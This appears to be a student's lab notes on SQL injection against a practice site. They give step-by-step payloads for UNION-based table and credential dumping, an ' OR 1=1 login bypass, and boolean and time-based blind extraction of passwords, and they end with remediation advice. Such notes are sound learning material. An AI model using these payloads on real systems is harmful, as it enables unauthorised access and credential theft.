### Table of contents
- [[#SQL Injection]]
- [[#In-Band SQLi]]
	- [[#Blind SQLi]]
	- [[#Authentication Bypass]]
	- [[#Boolean Based]]
	- [[#Time-Based]]
- [[#Out-of-Band SQLi]]
- 

___
### SQL Injection
[[#Table of contents|Back to the top]]

[[SQL]]

User input gets included in SQL query

`https://website.thm/blog?id=1`
--> webapp may use an SQL query like this:
`SELECT * from blog where id=1 and private=0 LIMIT 1;`

We want to access article ID 2 which is private
`https://website.thm/blog?id=2;--`

___
### In-Band SQLi
[[#Table of contents|Back to the top]]

Same method of communication for exploit of vulnerability and receiving results

**Error**-Based SQLi
Error message from database printed on browser screen --> can be used to enumerate whole database

**Union**-Based SQLi
Uses `SELECT` and `UNION`, common to extract large amounts of data


***Practical***

`https://website.thm/article?id=1` --> we will modify the value of the parameter `id` as our payload

1. Test for SQL error: `1'`
2. Try to exploit SQLi: `1 UNION SELECT 1`
   Error message: "different number of columns"
3. Add a column: `1 UNION SELECT 1,2`
   Error message: "different number of columns"
4. Add a column: `1 UNION SELECT 1,2,3`
   --> displays article
5. Change 1 with 0 so second part of query is displayed and not article: `0 UNION SELECT 1,2,3`
   --> displays column values 1, 2, 3
6. `0 UNION SELECT 1,2,database()`: get name of database --> `sql_one`
7. `0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'`: lists all tables in sqli_one database --> `article,staff_users`
8. `0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'` --> `id,password,username`
9. `0 UNION SELECT 1,2,group_concat(username,': ',password SEPARATOR '<br>') FROM staff_users`

___
### Blind SQLi

**Blind SQLi**: little to no feedback, disabled error message

#### Authentication Bypass
[[#Table of contents|Back to the top]]

Webapp less interested in whether username and password content, more in whether two make a matching pair
--> no need to find a valid pair, just to create database query that replies with yes/true


***Practical***

Username and password form

1. SQL query: `select * from users where username='%username%' and password='%password%' LIMIT 1;`
2. `' OR 1=1;--` into password field always returns true

#### Boolean Based
[[#Table of contents|Back to the top]]

Boolean refers to nature of response to injection attempt

***Practical***

`https://website.thm/checkuser?username=admin` --> we will modify the value of the parameter `username` as our payload

1. `{"taken":true}`: checks whether username is taken --> `admin`is already registered
   `username=admin1` returns "taken":false
2. `admin1' UNION SELECT 1;--` --> "taken:false"
3. Add columns until returns true: `admin1' UNION SELECT 1,2,3;--`
4. Use `database()` and `like` to find name of database: `admin1' UNION SELECT 1,2,3 where database() like '%';--` will return true because "%" matches anything
5. Modify the `like` parameter to guess the name until we have a true: ``admin1' UNION SELECT 1,2,3 where database() like 's%';--``
   "s%" returns true --> database name starts with an s
   The name of the database is `sqli_three`
6. Repeat process for tables (with `information_schema.tables`): `admin1' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--`
   --> we discover a table called `users`
7. Repeat process for columns: `admin1' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';`
8. After finding the column `id`, exclude it from the search: `and COLUMN_NAME !='id'`
9. We found a column called "username", we will test for usernames: `admin1' UNION SELECT 1,2,3 from users where username like 'a%`
   We confirm the existence of `admin`
10. We test for passwords: `admin1' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%`
    We find the password `3845`

#### Time-Based
[[#Table of contents|Back to the top]]

Similar to boolean-based but no visual indication of true/false
Indication is time query takes to complete --> use `SLEEP(x)` and `UNION` --> sleep will only execute if UNION SELECT statement succeeds

Pause = true
No pause = false


***Practical***

1. `admin123' UNION SELECT SLEEP(5);--` --> no pause so we add a column
2. `admin123' UNION SELECT SLEEP(5),2;--` --> pause so we found the right number of columns
3. Guess the name of the database: `admin123' UNION SELECT SLEEP(5),2 where database() like 'sqli_four%';--`
4. Repeat steps from boolean-based from step 6:
   - Tables: `admin123' UNION SELECT SLEEP(1),2 FROM information_schema.tables WHERE table_schema = 'sqli_four' and table_name like 'u%';--`
     Table `users` found
   - Columns: `admin123' UNION SELECT SLEEP(1),2 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_four' and TABLE_NAME='users' and COLUMN_NAME like '%';--`
     Columns `username`, `password` found
   - Username: `admin123' UNION SELECT SLEEP(1),2 from users where username like '%';--`
     Username `admin` found
   - Password: `admin123' UNION SELECT SLEEP(1),2 from users where username='admin' and password like '%';--`
     Password `4961` found

___
### Out-of-Band SQLi
[[#Table of contents|Back to the top]]

Less common, depends on specific features enabled on database server / webapp business logic, external network call based on result of SQL query

2 communication channels: 1) launch attack, 2) gather results

Example: 1) web request as attack channel, 2) monitor HTTP/DNS requests made to a service for results

![[Pasted image 20251130163009.png]]
1) Attacker makes request to webapp vulnerable to SQLi with injection payload
2) Webapp makes SQL query to database
3) Payload contains request forcing HTTP request back to hacker's machine

___
### Remediation
[[#Table of contents|Back to the top]]

**Prepared Statements** (with parametrized queries)
Ensure SQL code structure doesn't change, database can distinguish between query and data

**Input Validation**
Allow list, string replacement method filter characters

**Escaping User Input**
Prepend "`\`" to special characters such as `'`, `"`, `$`, `\` to make them parse as regular string and not special characters